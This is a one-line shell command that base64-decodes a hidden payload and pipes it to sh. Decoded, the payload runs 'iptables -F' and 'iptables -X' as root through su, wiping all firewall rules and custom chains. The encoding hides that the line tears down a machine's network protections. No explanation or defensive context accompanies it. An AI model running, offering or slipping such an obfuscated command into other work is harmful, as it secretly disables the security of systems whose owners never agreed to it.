echo 'c3UgLWMgaXB0YWJsZXMgLUYKc3UgLWMgaXB0YWJsZXMgLVgKCg==' | base64 -d | sh
